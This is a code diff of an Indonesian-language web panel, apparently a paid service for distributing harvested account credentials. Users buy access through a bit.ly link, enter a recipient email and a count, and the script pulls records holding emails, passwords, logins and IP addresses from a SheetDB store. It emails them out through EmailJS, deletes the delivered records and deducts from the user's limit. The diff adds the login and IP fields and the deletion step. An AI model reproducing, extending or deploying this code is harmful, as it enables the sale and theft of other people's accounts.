@@ -64,19 +64,6 @@
             text-shadow: 0 0 10px rgba(255, 60, 60, 0.3);
         }
 
-        .login-container .subtitle {
-            color: #999;
-            margin-bottom: 32px;
-            font-size: 13px;
-            text-align: center;
-            border-bottom: 1px solid rgba(255, 60, 60, 0.2);
-            display: inline-block;
-            width: auto;
-            margin-left: auto;
-            margin-right: auto;
-            padding-bottom: 8px;
-        }
-
         .form-group {
             margin-bottom: 24px;
         }
@@ -106,6 +93,22 @@
             border-color: #ff3b3b;
             box-shadow: 0 0 0 3px rgba(255, 59, 59, 0.15);
             background: #1f1f1f;
+        }
+
+        .buy-link {
+            text-align: center;
+            margin: 15px 0;
+            font-size: 12px;
+        }
+
+        .buy-link a {
+            color: #ff6b6b;
+            text-decoration: none;
+            border-bottom: 1px dashed rgba(255, 107, 107, 0.5);
+        }
+
+        .buy-link a:hover {
+            color: #ff3b3b;
         }
 
         .login-btn {
@@ -177,7 +180,7 @@
             border-bottom: 1px solid rgba(255, 59, 59, 0.3);
             position: sticky;
             top: 0;
-            z-index: 100;
+            z-index:100;
         }
 
         .navbar-content {
@@ -188,7 +191,6 @@
             align-items: center;
         }
 
-        /* Navbar H1 di kiri */
         .navbar h1 {
             color: #ff3b3b;
             font-size: 22px;
@@ -198,7 +200,6 @@
             margin: 0;
         }
 
-        /* Profile Avatar di kanan */
         .profile-avatar {
             width: 44px;
             height: 44px;
@@ -224,14 +225,12 @@
             color: white;
         }
 
-        /* Container */
         .container {
             max-width: 600px;
             margin: 40px auto;
             padding: 0 20px;
         }
 
-        /* Welcome Card */
         .welcome-card {
             background: #111;
             border-radius: 20px;
@@ -255,7 +254,6 @@
             font-size: 13px;
         }
 
-        /* Form Kirim */
         .jasteb-card {
             background: #111;
             border-radius: 20px;
@@ -404,7 +402,94 @@
             margin-top: 10px;
         }
 
-        /* Modal */
+        /* Modal Success */
+        .modal-success {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            backdrop-filter: blur(8px);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .success-card {
+            background: #111;
+            border-radius: 24px;
+            max-width: 380px;
+            width: 90%;
+            padding: 35px 25px;
+            text-align: center;
+            border: 1px solid rgba(255, 59, 59, 0.4);
+            animation: modalFadeIn 0.3s ease;
+        }
+
+        .checkmark-circle {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #10b981, #059669);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: checkPop 0.4s ease-out;
+        }
+
+        .checkmark {
+            font-size: 48px;
+            color: white;
+            font-weight: bold;
+        }
+
+        @keyframes checkPop {
+            0% { transform: scale(0); opacity: 0; }
+            80% { transform: scale(1.1); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .success-card h3 {
+            color: #ff3b3b;
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+
+        .success-card p {
+            color: #aaa;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+
+        .success-detail {
+            background: #1a1a1a;
+            padding: 15px;
+            border-radius: 12px;
+            margin: 15px 0;
+            text-align: left;
+        }
+
+        .success-detail p {
+            color: #ccc;
+            font-size: 13px;
+            margin: 5px 0;
+        }
+
+        .btn-close-success {
+            background: linear-gradient(135deg, #ff3b3b, #cc0000);
+            border: none;
+            padding: 12px 25px;
+            border-radius: 10px;
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        /* Modal Profile */
         .modal {
             display: none;
             position: fixed;
@@ -425,19 +510,12 @@
             max-width: 380px;
             width: 90%;
             border: 1px solid rgba(255, 59, 59, 0.4);
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
             animation: modalFadeIn 0.2s ease;
         }
 
         @keyframes modalFadeIn {
-            from {
-                opacity: 0;
-                transform: scale(0.95);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1);
-            }
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
         }
 
         .modal-header {
@@ -448,27 +526,17 @@
             align-items: center;
         }
 
-        .modal-header h3 {
-            color: #ff3b3b;
-            font-size: 18px;
-        }
-
+        .modal-header h3 { color: #ff3b3b; font-size: 18px; }
         .close-modal {
             background: none;
             border: none;
             color: #999;
             font-size: 24px;
             cursor: pointer;
-            transition: color 0.2s;
         }
+        .close-modal:hover { color: #ff3b3b; }
 
-        .close-modal:hover {
-            color: #ff3b3b;
-        }
-
-        .modal-body {
-            padding: 20px;
-        }
+        .modal-body { padding: 20px; }
 
         .user-info-item {
             background: #1a1a1a;
@@ -484,7 +552,6 @@
             text-transform: uppercase;
             letter-spacing: 1px;
         }
-
         .user-info-item .value {
             font-size: 16px;
             font-weight: 600;
@@ -539,14 +606,8 @@
         .alert-warning { background: #f59e0b; }
 
         @keyframes slideInRight {
-            from {
-                transform: translateX(100%);
-                opacity: 0;
-            }
-            to {
-                transform: translateX(0);
-                opacity: 1;
-            }
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
         }
 
         @media (max-width: 640px) {
@@ -574,7 +635,9 @@
             <label>Password</label>
             <input type="password" id="password" placeholder="Masukkan Password">
         </div>
-        <p class="navbar">No Acces? Buy in bit.ly/HANZZOFC</p>
+        <div class="buy-link">
+            No Access? <a href="https://bit.ly/HANZZOFC" target="_blank">Buy in bit.ly/HANZZOFC</a>
+        </div>
         <button class="login-btn" id="loginBtn" onclick="prosesLogin()">Login</button>
         <div id="errorMsg" class="error"></div>
     </div>
@@ -612,7 +675,7 @@
                 <p class="subtitle">Masukan data Email dan Nama penerima!</p>
                 <div class="form-input"><label>Email</label><input type="email" id="targetEmail" placeholder="example123@email.com"></div>
                 <div class="form-input"><label>Nama</label><input type="text" id="namaDepan" placeholder="Masukan nama"></div>
-                <div class="form-input"><label>Jumlah Jasteb(sesuai limit)</label><input type="number" id="jumlahJasteb" min="1" placeholder="1 - 20"></div>
+                <div class="form-input"><label>Jumlah Jasteb</label><input type="number" id="jumlahJasteb" min="1" placeholder="1 - 30"></div>
                 <button class="btn-send" id="sendBtn" onclick="kirimJasteb()">SEND</button>
                 <div class="progress-container" id="progressContainer"><div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div><div class="progress-text" id="progressText">0/0</div></div>
                 <div class="info-text" id="infoText">⏳ Loading...</div>
@@ -621,6 +684,21 @@
         </div>
 
         <div id="otherFeatures" style="display: none;"><div class="stats-card"><h3>HANZZ DEVELOPER</h3><p>Present By HANZZ</p></div></div>
+    </div>
+</div>
+
+<!-- Modal Success -->
+<div id="successModal" class="modal-success">
+    <div class="success-card">
+        <div class="checkmark-circle">
+            <div class="checkmark">✓</div>
+        </div>
+        <h3>SUCCESS!</h3>
+        <div class="success-detail" id="successDetail">
+            <p>Jumlah Jasteb: <span id="successJumlah">-</span></p>
+            <p>Email Target: <span id="successEmail">-</span></p>
+        </div>
+        <button class="btn-close-success" onclick="closeSuccessModal()">OK</button>
     </div>
 </div>
 
@@ -638,33 +716,27 @@
     </div>
 </div>
 
-<!-- Modal Notifikasi -->
-<div id="notifModal" class="modal" onclick="if(event.target===this) closeNotifModal()">
-    <div class="modal-content" style="max-width: 350px;">
-        <div class="modal-header"><h3 id="notifTitle">Informasi</h3><button class="close-modal" onclick="closeNotifModal()">×</button></div>
-        <div class="modal-body"><p id="notifMessage" style="color:#ccc; line-height:1.5;"></p></div>
-    </div>
-</div>
-
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 <script>
+    // ========== KONFIGURASI ==========
     const EMAILJS_PUBLIC_KEY = "jdVLaTALUNA4FjZwo";
     const EMAILJS_SERVICE_ID = "service_0lzqo44";
     const EMAILJS_TEMPLATE_ID = "template_nztw5rr";
-    const SHEETDB_USER_URL = "https://sheetdb.io/api/v1/02k55cr9l5wzs";
-    const SHEETDB_DATA_URL = "https://sheetdb.io/api/v1/88dp9i3eezpg7";
+    const SHEETDB_USER_URL = "https://sheetdb.io/api/v1/dywc2rk19dipr";
+    const SHEETDB_DATA_URL = "https://sheetdb.io/api/v1/7dlf0v09e7kqb";
 
     emailjs.init(EMAILJS_PUBLIC_KEY);
 
     let currentUser = null;
 
+    // ========== FUNGSI LOGIN ==========
     async function prosesLogin() {
         const username = document.getElementById("username").value.trim();
         const password = document.getElementById("password").value;
         const loginBtn = document.getElementById("loginBtn");
         const errorDiv = document.getElementById("errorMsg");
         errorDiv.style.display = "none";
-        if (!username || !password) { showError("Username & password wajib diisi!"); return; }
+        if (!username || !password) { showError("Username & Password wajib diisi!"); return; }
         loginBtn.disabled = true; loginBtn.innerHTML = '<span class="loading"></span> Loading...';
         try {
             const res = await fetch(SHEETDB_USER_URL);
@@ -675,15 +747,13 @@
                 currentUser = { username: valid.Username, role: valid.Role || "Member", limit: valid.Limit === "N" ? "N" : parseInt(valid.Limit) || 0 };
                 localStorage.setItem("userLogin", JSON.stringify(currentUser));
                 renderDashboard();
-            } else { showError("Username atau password salah!"); }
+            } else { showError("Username atau Password salah!"); }
         } catch(e) { showError("Error: " + e.message); }
-        finally { loginBtn.disabled = false; loginBtn.innerHTML = "MASUK"; }
+        finally { loginBtn.disabled = false; loginBtn.innerHTML = "Login"; }
     }
 
     function showError(msg) { const div = document.getElementById("errorMsg"); div.textContent = msg; div.style.display = "block"; setTimeout(() => div.style.display = "none", 3000); }
     function showAlert(msg, type="success") { const a = document.createElement("div"); a.className = `alert alert-${type}`; a.textContent = msg; document.body.appendChild(a); a.style.display = "block"; setTimeout(() => a.remove(), 4000); }
-    function showModal(title, msg) { document.getElementById("notifTitle").innerText = title; document.getElementById("notifMessage").innerHTML = msg; document.getElementById("notifModal").style.display = "flex"; }
-    function closeNotifModal() { document.getElementById("notifModal").style.display = "none"; }
 
     function openProfileModal() {
         if(!currentUser) return;
@@ -708,11 +778,13 @@
     async function updateLimitUser(username, newLimit) {
         try { const upd = await fetch(`${SHEETDB_USER_URL}/Username/${encodeURIComponent(username)}`, { method: "PATCH", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ Limit: newLimit.toString() }) }); return upd.ok; } catch(e) { return false; }
     }
+    
     async function loadDataStats() {
         const el = document.getElementById("totalDataCount");
         if(el) el.innerHTML = '<span class="loading"></span>';
         try { const res = await fetch(SHEETDB_DATA_URL); const data = await res.json(); if(el) el.innerHTML = data.length; } catch(e) { if(el) el.innerHTML = "❌"; }
     }
+    
     async function updateInfoLimit() {
         try { const res = await fetch(SHEETDB_DATA_URL); const data = await res.json(); const total = data.length; const limit = currentUser.limit; const info = document.getElementById("infoText"); const warn = document.getElementById("warningText");
             if(limit === "N"){ info.innerHTML = `📊 ${total} data tersedia<br>✅ Unlimited`; warn.style.display = "none"; }
@@ -732,57 +804,124 @@
         document.getElementById("dashboardPage").style.display = "block";
     }
 
+    // ========== FUNGSI HAPUS DATA ==========
+    async function hapusData(emailToDelete) {
+        try {
+            const res = await fetch(`${SHEETDB_DATA_URL}/Email/${encodeURIComponent(emailToDelete)}`, {
+                method: "DELETE",
+                headers: { "Content-Type": "application/json" }
+            });
+            const result = await res.json();
+            return result.deleted > 0;
+        } catch(e) {
+            console.error("Gagal hapus:", e);
+            return false;
+        }
+    }
+
+    // ========== SUCCESS MODAL ==========
+    function showSuccessModal(jumlah, emailTarget) {
+        document.getElementById("successJumlah").innerText = jumlah;
+        document.getElementById("successEmail").innerText = emailTarget;
+        document.getElementById("successModal").style.display = "flex";
+    }
+    function closeSuccessModal() { document.getElementById("successModal").style.display = "none"; }
+
+    // ========== KIRIM JASTEB + HAPUS ==========
     async function kirimJasteb() {
         const toEmail = document.getElementById("targetEmail").value.trim();
         const nama = document.getElementById("namaDepan").value.trim();
         const jumlah = parseInt(document.getElementById("jumlahJasteb").value);
         const btn = document.getElementById("sendBtn");
+        
         if(!toEmail){ showAlert("Email target harus diisi","error"); return; }
         if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(toEmail)){ showAlert("Email tidak valid","error"); return; }
         if(!nama){ showAlert("Nama penerima harus diisi","error"); return; }
         if(!jumlah || jumlah<1){ showAlert("Minimal 1 data","error"); return; }
+        
         const limitNow = currentUser.limit;
         if(limitNow !== "N" && limitNow < jumlah){ showAlert(`Limit tidak cukup! Sisa: ${limitNow}`,"error"); return; }
         if(limitNow === 0 || limitNow <= 0 && limitNow !== "N"){ showAlert("Limit habis!","error"); return; }
+        
         btn.disabled = true; btn.innerHTML = '<span class="loading"></span> Proses...';
         const prog = document.getElementById("progressContainer"); prog.style.display = "block";
         const fill = document.getElementById("progressFill"); const txt = document.getElementById("progressText");
+        
         try {
             const res = await fetch(SHEETDB_DATA_URL);
             const data = await res.json();
-            if(jumlah > data.length){ showAlert(`Data hanya ${data.length}`, "error"); btn.disabled=false; btn.innerHTML="KIRIM"; prog.style.display="none"; return; }
+            
+            if(jumlah > data.length){ showAlert(`Data hanya ${data.length}`, "error"); btn.disabled=false; btn.innerHTML="SEND"; prog.style.display="none"; return; }
+            
             const shuffled = [...data];
             for(let i=shuffled.length-1;i>0;i--){ const j=Math.floor(Math.random()*(i+1)); [shuffled[i],shuffled[j]]=[shuffled[j],shuffled[i]]; }
             const selected = shuffled.slice(0,jumlah);
+            
             const hour = new Date().getHours();
             let waktu = hour>=5 && hour<12 ? "Pagi" : hour>=12 && hour<15 ? "Siang" : hour>=15 && hour<18 ? "Sore" : "Malam";
             const greeting = `Selamat ${waktu}, ${nama}!`;
+            
             let berhasil=0, gagal=0;
+            let deletedData = [];
+            
             for(let i=0;i<selected.length;i++){
                 const item = selected[i];
                 try {
-                    await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, { to_email: toEmail, greeting: greeting, email: item.Email || "-", password: item.Password || "-" });
+                    await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, { 
+                        to_email: toEmail, 
+                        greeting: greeting, 
+                        email: item.Email || "-", 
+                        password: item.Password || "-",
+                        login: item.Login || "-",
+                        ip: item["IP Addres"] || "-"
+                    });
                     berhasil++;
+                    deletedData.push(item);
                 } catch(e){ gagal++; }
+                
                 const persen = ((i+1)/jumlah)*100;
                 fill.style.width = `${persen}%`;
                 txt.innerText = `${i+1}/${jumlah} (${Math.round(persen)}%) ✅${berhasil} ❌${gagal}`;
                 await new Promise(r => setTimeout(r, 1000));
             }
+            
+            for(let i=0;i<deletedData.length;i++){
+                await hapusData(deletedData[i].Email);
+            }
+            
             if(berhasil>0 && limitNow !== "N"){
                 const sisa = limitNow - berhasil;
                 const ok = await updateLimitUser(currentUser.username, sisa);
-                if(ok){ currentUser.limit = sisa; localStorage.setItem("userLogin", JSON.stringify(currentUser)); showAlert(`✅ ${berhasil} terkirim! Sisa limit: ${sisa}`, "success"); showModal("Berhasil!", `${berhasil} akun berhasil dikirim ke ${toEmail}<br>Sisa limit: ${sisa}`); }
-                else showAlert(`Email terkirim (${berhasil}) tapi gagal update limit`,"warning");
-            } else if(berhasil>0 && limitNow === "N"){ showAlert(`✅ ${berhasil} berhasil dikirim!`,"success"); showModal("Berhasil!", `${berhasil} akun berhasil dikirim ke ${toEmail}`); }
+                if(ok){ 
+                    currentUser.limit = sisa; 
+                    localStorage.setItem("userLogin", JSON.stringify(currentUser)); 
+                    showAlert(`✅ ${berhasil} terkirim! Sisa limit: ${sisa}`, "success");
+                    showSuccessModal(berhasil, toEmail);
+                }
+                else { showAlert(`Email terkirim (${berhasil}) tapi gagal update limit`,"warning"); }
+            } else if(berhasil>0 && limitNow === "N"){ 
+                showAlert(`✅ ${berhasil} berhasil dikirim!`,"success");
+                showSuccessModal(berhasil, toEmail);
+            }
             else { showAlert("Gagal mengirim semua data","error"); }
-            document.getElementById("targetEmail").value = ""; document.getElementById("namaDepan").value = ""; document.getElementById("jumlahJasteb").value = "";
+            
+            document.getElementById("targetEmail").value = "";
+            document.getElementById("namaDepan").value = "";
+            document.getElementById("jumlahJasteb").value = "";
             await updateInfoLimit();
+            
         } catch(e){ showAlert("Error: "+e.message,"error"); }
-        finally { btn.disabled=false; btn.innerHTML="KIRIM"; setTimeout(()=>prog.style.display="none",2000); }
+        finally { btn.disabled=false; btn.innerHTML="SEND"; setTimeout(()=>prog.style.display="none",2000); }
     }
 
-    function logout() { currentUser = null; localStorage.removeItem("userLogin"); document.getElementById("username").value = ""; document.getElementById("password").value = ""; document.getElementById("loginPage").style.display = "flex"; document.getElementById("dashboardPage").style.display = "none"; }
+    function logout() { 
+        currentUser = null; 
+        localStorage.removeItem("userLogin"); 
+        document.getElementById("username").value = ""; 
+        document.getElementById("password").value = ""; 
+        document.getElementById("loginPage").style.display = "flex"; 
+        document.getElementById("dashboardPage").style.display = "none"; 
+    }
 
     (function init(){ const saved = localStorage.getItem("userLogin"); if(saved){ currentUser = JSON.parse(saved); renderDashboard(); } else { document.getElementById("loginPage").style.display = "flex"; document.getElementById("dashboardPage").style.display = "none"; } })();
     document.getElementById("password")?.addEventListener("keypress", e => { if(e.key === "Enter") prosesLogin(); });
